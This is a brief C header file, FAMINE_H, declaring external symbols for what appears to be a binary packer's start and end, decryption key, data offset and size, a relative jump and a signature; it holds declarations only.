#ifndef FAMINE_H
# define FAMINE_H

#include <stddef.h>
#include <stdint.h>

extern void packer_start();
extern void packer_end();
extern void key();
extern void offset_to_data();
extern void size_to_decrypt();
extern void jmp_rel();
extern void data_page_size();
extern void sign();
//extern void sign_key();
extern uint32_t sign_key;


#endif
